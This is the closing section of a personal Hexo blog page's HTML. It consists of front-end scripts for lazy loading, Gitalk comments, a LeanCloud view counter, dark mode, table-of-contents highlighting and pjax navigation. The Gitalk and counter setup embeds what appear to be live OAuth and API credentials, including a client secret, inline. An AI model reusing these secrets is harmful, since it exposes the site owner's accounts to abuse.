      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    lazyLoadInstance.update();
  });
  document.addEventListener('pjax:complete', function () {
    lazyLoadInstance.update();
  });
</script>




  

<script>
  window.FPConfig = {
	delay: 0,
	ignoreKeywords: [],
	maxRPS: 5,
	hoverDelay: 25
  };
</script>
<script defer src="https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"></script>











  <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
<script type="text/javascript">
  function pjax_gitalk() {
    if(!document.querySelectorAll("#gitalk-container")[0])return;
    let path = pdata.commentPath;
    if (path.length == 0) {
      let defaultPath = '';
      path = defaultPath || decodeURI(window.location.pathname);
    }
    if (document.getElementById('gitalk-container') != null) {
      var gitalk = new Gitalk(Object.assign({"clientID":"71041770cc5d77158add","clientSecret":"e6825eb932dd754c2690903ffea01232bf0fc87f","repo":"tarimoe.github.io","owner":"tarimoe","admin":["tarimoe"],"path":null}, {
	  id: path,
	  distractionFreeMode: false  // Facebook-like distraction free mode
    }));
      gitalk.render('gitalk-container');
    }
  }
  $(function () {
    pjax_gitalk();
  });
  volantis.pjax.push(pjax_gitalk);
</script>






  
<script src="/js/app.js"></script>



<!-- optional -->

  <script>
const SearchServiceimagePath="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@master/img/";
const ROOT =  ("/" || "/").endsWith('/') ? ("/" || "/") : ("//" || "/" );

$('.input.u-search-input').one('focus',function(){
	
		loadScript('/js/search/hexo.js',setSearchService);
	
})

function listenSearch(){
  
    customSearch = new HexoSearch({
      imagePath: SearchServiceimagePath
    });
  
}
function setSearchService() {
	listenSearch();
	
}
</script>











  <script defer>

  const LCCounter = {
    app_id: 'drHoUTNkw1UylDdn7MwkAry5-MdYXbMMI',
    app_key: 'JgkgW3M15DEOEujk1nYGmmIx',
    custom_api_server: '',

    // 查询存储的记录
    getRecord(Counter, url, title) {
      return new Promise(function (resolve, reject) {
        Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({url})))
          .then(resp => resp.json())
          .then(({results, code, error}) => {
            if (code === 401) {
              throw error;
            }
            if (results && results.length > 0) {
              var record = results[0];
              resolve(record);
            } else {
              Counter('post', '/classes/Counter', {url, title: title, times: 0})
                .then(resp => resp.json())
                .then((record, error) => {
                  if (error) {
                    throw error;
                  }
                  resolve(record);
                }).catch(error => {
                console.error('Failed to create', error);
                reject(error);
              });
            }
          }).catch((error) => {
          console.error('LeanCloud Counter Error:', error);
          reject(error);
        });
      })
    },

    // 发起自增请求
    increment(Counter, incrArr) {
      return new Promise(function (resolve, reject) {
        Counter('post', '/batch', {
          "requests": incrArr
        }).then((res) => {
          res = res.json();
          if (res.error) {
            throw res.error;
          }
          resolve(res);
        }).catch((error) => {
          console.error('Failed to save visitor count', error);
          reject(error);
        });
      });
    },

    // 构建自增请求体
    buildIncrement(objectId) {
      return {
        "method": "PUT",
        "path": `/1.1/classes/Counter/${ objectId }`,
        "body": {
          "times": {
            '__op': 'Increment',
            'amount': 1
          }
        }
      }
    },

    // 校验是否为有效的 UV
    validUV() {
      var key = 'LeanCloudUVTimestamp';
      var flag = localStorage.getItem(key);
      if (flag) {
        // 距离标记小于 24 小时则不计为 UV
        if (new Date().getTime() - parseInt(flag) <= 86400000) {
          return false;
        }
      }
      localStorage.setItem(key, new Date().getTime().toString());
      return true;
    },

    addCount(Counter) {
      var enableIncr = '' === 'true' && window.location.hostname !== 'localhost';
      enableIncr = true;
      var getterArr = [];
      var incrArr = [];
      // 请求 PV 并自增
      var pvCtn = document.querySelector('#lc-sv');
      if (pvCtn || enableIncr) {
        var pvGetter = this.getRecord(Counter, 'https://tari.moe' + '/#lc-sv', 'Visits').then((record) => {
          incrArr.push(this.buildIncrement(record.objectId))
          var eles = document.querySelectorAll('#lc-sv #number');
          if (eles.length > 0) {
            eles.forEach((el,index,array)=>{
              el.innerText = record.times + 1;
              if (pvCtn) {
                pvCtn.style.display = 'inline';
              }
            })
          }
        });
        getterArr.push(pvGetter);
      }

      // 请求 UV 并自增
      var uvCtn = document.querySelector('#lc-uv');
      if (uvCtn || enableIncr) {
        var uvGetter = this.getRecord(Counter, 'https://tari.moe' + '/#lc-uv', 'Visitors').then((record) => {
          var vuv = this.validUV();
          vuv && incrArr.push(this.buildIncrement(record.objectId))
          var eles = document.querySelectorAll('#lc-uv #number');
          if (eles.length > 0) {
            eles.forEach((el,index,array)=>{
              el.innerText = record.times + (vuv ? 1 : 0);
              if (uvCtn) {
                uvCtn.style.display = 'inline';
              }
            })
          }
        });
        getterArr.push(uvGetter);
      }

      // 请求文章的浏览数，如果是当前页面就自增
      var allPV = document.querySelectorAll('#lc-pv');
      if (allPV.length > 0 || enableIncr) {
        for (i = 0; i < allPV.length; i++) {
          let pv = allPV[i];
          let title = pv.getAttribute('data-title');
          var url = 'https://tari.moe' + pv.getAttribute('data-path');
          if (url) {
            var viewGetter = this.getRecord(Counter, url, title).then((record) => {
              // 是当前页面就自增
              let curPath = window.location.pathname;
              if (curPath.includes('index.html')) {
                curPath = curPath.substring(0, curPath.lastIndexOf('index.html'));
              }
              if (pv.getAttribute('data-path') == curPath) {
                incrArr.push(this.buildIncrement(record.objectId));
              }
              if (pv) {
                var ele = pv.querySelector('#lc-pv #number');
                if (ele) {
                  if (pv.getAttribute('data-path') == curPath) {
                    ele.innerText = (record.times || 0) + 1;
                  } else {
                    ele.innerText = record.times || 0;
                  }
                  pv.style.display = 'inline';
                }
              }
            });
            getterArr.push(viewGetter);
          }
        }
      }

      // 如果启动计数自增，批量发起自增请求
      if (enableIncr) {
        Promise.all(getterArr).then(() => {
          incrArr.length > 0 && this.increment(Counter, incrArr);
        })
      }

    },


    fetchData(api_server) {
      var Counter = (method, url, data) => {
        return fetch(`${ api_server }/1.1${ url }`, {
          method,
          headers: {
            'X-LC-Id': this.app_id,
            'X-LC-Key': this.app_key,
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(data)
        });
      };
      this.addCount(Counter);
    },

    refreshCounter() {
      var api_server = this.app_id.slice(-9) !== '-MdYXbMMI' ? this.custom_api_server : `https://${ this.app_id.slice(0, 8).toLowerCase() }.api.lncldglobal.com`;
      if (api_server) {
        this.fetchData(api_server);
      } else {
        fetch('https://app-router.leancloud.cn/2/route?appId=' + this.app_id)
          .then(resp => resp.json())
          .then(({api_server}) => {
            this.fetchData('https://' + api_server);
          });
      }
    }

  };

  LCCounter.refreshCounter();

  document.addEventListener('pjax:complete', function () {
    LCCounter.refreshCounter();
  });
</script>




  <script>
const rootElement = document.documentElement;
const darkModeStorageKey = "user-color-scheme";
const rootElementDarkModeAttributeName = "data-user-color-scheme";

const setLS = (k, v) => {
    localStorage.setItem(k, v);
};

const removeLS = (k) => {
    localStorage.removeItem(k);
};

const getLS = (k) => {
    return localStorage.getItem(k);
};

const getModeFromCSSMediaQuery = () => {
  return window.matchMedia("(prefers-color-scheme: dark)").matches
    ? "dark"
    : "light";
};

const resetRootDarkModeAttributeAndLS = () => {
  rootElement.removeAttribute(rootElementDarkModeAttributeName);
  removeLS(darkModeStorageKey);
};

const validColorModeKeys = {
  dark: true,
  light: true,
};

const applyCustomDarkModeSettings = (mode) => {
  const currentSetting = mode || getLS(darkModeStorageKey);

  if (currentSetting === getModeFromCSSMediaQuery()) {
    resetRootDarkModeAttributeAndLS();
  } else if (validColorModeKeys[currentSetting]) {
    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);
  } else {
    resetRootDarkModeAttributeAndLS();
  }
};

const invertDarkModeObj = {
  dark: "light",
  light: "dark",
};

/**
 * get target mode
 */
const toggleCustomDarkMode = () => {
  let currentSetting = getLS(darkModeStorageKey);

  if (validColorModeKeys[currentSetting]) {
    currentSetting = invertDarkModeObj[currentSetting];
  } else if (currentSetting === null) {
    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];
  } else {
    return;
  }
  setLS(darkModeStorageKey, currentSetting);
  return currentSetting;
};

/**
 * bind click event for toggle button
 */
var btn=$("#wrapper .toggle-mode-btn,#rightmenu-wrapper .toggle-mode-btn");
function bindToggleButton() {
    btn.on('click',(e) => {
      const mode = toggleCustomDarkMode();
      applyCustomDarkModeSettings(mode);
    });
}

applyCustomDarkModeSettings();
document.addEventListener("DOMContentLoaded", bindToggleButton);
volantis.pjax.push(bindToggleButton);
volantis.pjax.send(()=>{
	btn.unbind('click');
},'toggle-mode-btn-unbind');
</script>








<script>
function listennSidebarTOC() {
  const navItems = document.querySelectorAll(".toc li");
  if (!navItems.length) return;
  const sections = [...navItems].map((element) => {
    const link = element.querySelector(".toc-link");
    const target = document.getElementById(
      decodeURI(link.getAttribute("href")).replace("#", "")
    );
    link.addEventListener("click", (event) => {
      event.preventDefault();
      window.scrollTo({
		top: target.offsetTop + 100,
		
		behavior: "smooth"
		
	  });
    });
    return target;
  });

  function activateNavByIndex(target) {
    if (target.classList.contains("active-current")) return;

    document.querySelectorAll(".toc .active").forEach((element) => {
      element.classList.remove("active", "active-current");
    });
    target.classList.add("active", "active-current");
    let parent = target.parentNode;
    while (!parent.matches(".toc")) {
      if (parent.matches("li")) parent.classList.add("active");
      parent = parent.parentNode;
    }
  }

  function findIndex(entries) {
    let index = 0;
    let entry = entries[index];
    if (entry.boundingClientRect.top > 0) {
      index = sections.indexOf(entry.target);
      return index === 0 ? 0 : index - 1;
    }
    for (; index < entries.length; index++) {
      if (entries[index].boundingClientRect.top <= 0) {
        entry = entries[index];
      } else {
        return sections.indexOf(entry.target);
      }
    }
    return sections.indexOf(entry.target);
  }

  function createIntersectionObserver(marginTop) {
    marginTop = Math.floor(marginTop + 10000);
    let intersectionObserver = new IntersectionObserver(
      (entries, observe) => {
        let scrollHeight = document.documentElement.scrollHeight + 100;
        if (scrollHeight > marginTop) {
          observe.disconnect();
          createIntersectionObserver(scrollHeight);
          return;
        }
        let index = findIndex(entries);
        activateNavByIndex(navItems[index]);
      },
      {
        rootMargin: marginTop + "px 0px -100% 0px",
        threshold: 0,
      }
    );
    sections.forEach((element) => {
      element && intersectionObserver.observe(element);
    });
  }
  createIntersectionObserver(document.documentElement.scrollHeight);
}

document.addEventListener("DOMContentLoaded", listennSidebarTOC);
document.addEventListener("pjax:success", listennSidebarTOC);
</script>

<!-- more -->

 
	   
	    


<script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script>


<script>
    var pjax;
    document.addEventListener('DOMContentLoaded', function () {
      pjax = new Pjax({
        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
        selectors: [
          "title",
          
          "#pjax-container",
          "#pjax-header-nav-list"
        ],
        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
        timeout: 5000
      });
    });

    document.addEventListener('pjax:send', function (e) {
      //window.stop(); // 相当于点击了浏览器的停止按钮

      try {
        var currentUrl = window.location.pathname;
        var targetUrl = e.triggerElement.href;
        var banUrl = [""];
        if (banUrl[0] != "") {
          banUrl.forEach(item => {
            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
              window.location.href = targetUrl;
            }
          });
        }
      } catch (error) {}

      window.subData = null; // 移除标题（用于一二级导航栏切换处）

      volantis.$switcher.removeClass('active'); // 关闭移动端激活的搜索框
      volantis.$header.removeClass('z_search-open'); // 关闭移动端激活的搜索框
      volantis.$wrapper.removeClass('sub'); // 跳转页面时关闭二级导航

      // 解绑事件 避免重复监听
      volantis.$topBtn.unbind('click');
      $('.menu a').unbind('click');
      $(window).unbind('resize');
      $(window).unbind('scroll');
      $(document).unbind('scroll');
      $(document).unbind('click');
      $('body').unbind('click');
	  // 使用 volantis.pjax.send 方法传入pjax:send回调函数 参见layout/_partial/scripts/global.ejs
	  volantis.pjax.method.send.start();
    });

    document.addEventListener('pjax:complete', function () {
      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
      $('script[data-pjax], .pjax-reload script').each(function () {
        $(this).parent().append($(this).remove());
      });
      try{
		// 使用 volantis.pjax.push 方法传入重载函数 参见layout/_partial/scripts/global.ejs
		volantis.pjax.method.complete.start();
      } catch (e) {
        console.log(e);
      }
    });

    document.addEventListener('pjax:error', function (e) {
	  // 使用 volantis.pjax.error 方法传入pjax:error回调函数 参见layout/_partial/scripts/global.ejs
	  volantis.pjax.method.error.start();
      window.location.href = e.triggerElement.href;
    });
</script>
 
	  
    </div>
  <script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>